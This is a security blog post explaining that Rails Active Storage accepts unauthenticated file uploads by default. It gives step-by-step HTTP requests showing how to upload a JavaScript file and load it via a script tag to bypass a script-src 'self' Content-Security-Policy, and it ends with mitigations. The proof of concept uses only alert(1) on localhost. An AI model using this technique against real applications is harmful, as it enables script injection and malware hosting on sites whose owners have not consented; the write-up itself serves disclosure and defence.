---
layout: post
title: "Rails & Active Storage"
summary: "Unauthenticated file upload & possible CSP bypass"
date:   2025-06-30 16:10:00 -0400
categories: Web 
---

# Using Rails' Active Storage And Bypass CSP

> TLDR: ActiveStorage from Rails allows unauthenticated file uploads. It cannot be used directly for XSS, but can be used to bypass CSP (or to host malware).

Active Storage is a built-in feature in Rails that allows users to upload files. It is often used to attach profile pictures to a user. Developers can configure where files are stored. Those can be on the disk, on S3 buckets, Google Cloud Storage, etc. Files can also be transformed using `ffmpeg`, `muPDF` , `ImageMagick` and some other tools.

When enabled, this feature is accessible, by default, to unauthenticated users. They can upload any files to the app and download them. They can even reach endpoints that transform files into other formats! This would allow an attacker to abuse a vulnerable version of `ImageMagick` and potentially gain RCE.

To mitigate the risks of XSS, files are returned by the server alongside the HTTP header `Content-Disposition: attachment`for most filetypes. This header tells the browser to download the file instead of rendering it directly. So, instead of having your `alert(1)`, your browser would ask you to download the file.

A couple of security considerations also exist:

- Filenames are sanitized [here](https://github.com/rails/rails/blob/main/activestorage/app/models/active_storage/filename.rb#L59,L61), which helps prevent injections (RCE, headers):
  
  ```rb
    def sanitized
      @filename.encode(Encoding::UTF_8, invalid: :replace, undef: :replace, replace: "�").strip.tr("\u{202E}%$|:;/<>?*\"\t\r\n\\", "-")
    end
  ```
  
- Content-types are validated against a list. Only [these](https://github.com/rails/rails/blob/main/activestorage/lib/active_storage/engine.rb#L65-L76) can be inlined:
  
  ```rb
    config.active_storage.content_types_allowed_inline = %w(
      image/webp
      image/avif
      image/png
      image/gif
      image/jpeg
      image/tiff
      image/bmp
      image/vnd.adobe.photoshop
      image/vnd.microsoft.icon
      application/pdf
    )
  ```

  As far as I know, none of these can be used for XSS.
 
 - There might be anti CSRF, we'd need a token first.

## CSP Bypass

If there's a CSP similar to `Content-Security-Policy: script-src 'self';`, this would prevent any payload like `<script>alert(1)</script>` and `<svg onload=alert(1)>`. By uploading a JavaScript file using Active Storage, it allows an attacker to bypass this restriction. Even when files have the `Content-Disposition: attachment` header, the browser will happily load and execute JavaScript if we use the `<script src>` like so: `<script src="//example.com/test.js"></script>`.

## Technical Details

The following details assume the configuration allows users to upload files on the disk directly. This is just for simplicity; similar payloads would work if the application is using S3 or other cloud providers.

Configuring Active Storage is pretty straightforward and you can follow the official doc [here](https://guides.rubyonrails.org/active_storage_overview.html).

### Exposed Routes

All accessible routes are defined in this [routes.rb](https://github.com/rails/rails/blob/main/activestorage/config/routes.rb) file. Here is more information on the relevant ones in our case. They can be accessed via `example.com/rails/active_storage/*`. All routes are implemented in `activestorage/app/controllers/active_storage/*.rb`.

```rb
post "/direct_uploads" # Allows us to create an "empty file"
put  "/disk/:encoded_token" # Allows us to upload the file content
get "/blobs/proxy/:signed_id/*filename" # Allows us to see the file
```

### Create The File

```
POST /rails/active_storage/direct_uploads HTTP/1.1
Host: localhost:3000
Content-type: application/json
Content-Length: 145

{ "blob":{ "filename":"test.js", "byte_size":"460", "checksum":"sfeC7XeVlcORGXQTjSHrcw==", "content_type":"text/javascript", "metadata": {} } }
```

The server should respond with a blob of JSON containing all the info we need.

```json
{
  "id": 63,
  "key": "sduznqminzw7q2qnnfaekukgfcam",
  "filename": "test.js",
  "content_type": "text/javascript",
  "metadata": {},
  "service_name": "local",
  "byte_size": 8,
  "checksum": "I46W1bYqGuw3OXMEafJxkg==",
  "created_at": "2025-04-23T23:35:38.274Z",
  "attachable_sgid": "eyJfcmFpbHMiOnsiZGF0YSI6ImdpZDovL3Byb3h5LXhzcy9BY3RpdmVTdG9yYWdlOjpCbG9iLzYzP2V4cGlyZXNfaW4iLCJwdXIiOiJhdHRhY2hhYmxlIn19--96b3263fa7716e9cd776a927e6669e80ce2ede68",
  "signed_id": "eyJfcmFpbHMiOnsiZGF0YSI6NjMsInB1ciI6ImJsb2JfaWQifX0=--5ced2e88192089617d33f635398bb4a7595ba198",
  "direct_upload": {
    "url": "http://localhost:3000/rails/active_storage/disk/eyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiJzZHV6bnFtaW56dzdxMnFubmZhZWt1a2dmY2FtIiwiY29udGVudF90eXBlIjoidGV4dC9qYXZhc2NyaXB0IiwiY29udGVudF9sZW5ndGgiOjgsImNoZWNrc3VtIjoiSTQ2VzFiWXFHdXczT1hNRWFmSnhrZz09Iiwic2VydmljZV9uYW1lIjoibG9jYWwifSwiZXhwIjoiMjAyNS0wNC0yM1QyMzo0MDozOC4yOTlaIiwicHVyIjoiYmxvYl90b2tlbiJ9fQ==--30cd81cba0dc75cb2505313ce2bd4d67c57566cd",
    "headers": {
      "Content-Type": "text/javascript"
    }
  }
}
```

### Add Content To the File

We need to take the `url` from the JSON above and add our content:

```
PUT /rails/active_storage/disk/eyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiJzZHV6bnFtaW56dzdxMnFubmZhZWt1a2dmY2FtIiwiY29udGVudF90eXBlIjoidGV4dC9qYXZhc2NyaXB0IiwiY29udGVudF9sZW5ndGgiOjgsImNoZWNrc3VtIjoiSTQ2VzFiWXFHdXczT1hNRWFmSnhrZz09Iiwic2VydmljZV9uYW1lIjoibG9jYWwifSwiZXhwIjoiMjAyNS0wNC0yM1QyMzo0MDozOC4yOTlaIiwicHVyIjoiYmxvYl90b2tlbiJ9fQ==--30cd81cba0dc75cb2505313ce2bd4d67c57566cd HTTP/1.1
Host: localhost:3000
Content-type: text/javascript
Content-Length: 8

alert(1)
```

### Retrieve The File

Just take the `signed_id` and add it to the `/blobs/proxy` URL.
```
GET /rails/active_storage/blobs/proxy/eyJfcmFpbHMiOnsiZGF0YSI6NjMsInB1ciI6ImJsb2JfaWQifX0=--5ced2e88192089617d33f635398bb4a7595ba198/test.js HTTP/1.1
```

Or, `<script src="http://localhost:3000/rails/active_storage/blobs/proxy/eyJfcmFpbHMiOnsiZGF0YSI6NjMsInB1ciI6ImJsb2JfaWQifX0=--5ced2e88192089617d33f635398bb4a7595ba198/test.js"></script>`

And you should get your `alert(1)`.

### Transformations

A couple of endpoints allow conversion of PDF/Videos to PNG. They begin with `/representations`:

```rb
get "/representations/redirect/:signed_blob_id/:variation_key/*filename"
get "/representations/proxy/:signed_blob_id/:variation_key/*filename"
get "/representations/:signed_blob_id/:variation_key/*filename"
```

They all seem secure, meaning we don't have control over the arguments being passed to the converters, nor do we have control over the filename. If there's a known vulnerability in one of the converters (not that ImageMagick is known for having vulnerabilities, but...), this might allow us to trigger it.

## Mitigations
There are a couple of mitigations possible:
- Keep patching and having up-to-date rails and converters
- Restrict the transformations/previewers with `config.active_storage.analyzers` and `config.active_storage.previewers`
- Do not expose the routes by setting `config.active_storage.draw_routes` to false
- Run a task to delete unattached files with `purge_unattached`. Reference [here](https://guides.rubyonrails.org/active_storage_overview.html#purging-unattached-uploads)
- Use a subdomain to host files
- Run scanners against file when they are uploaded with `after_create`
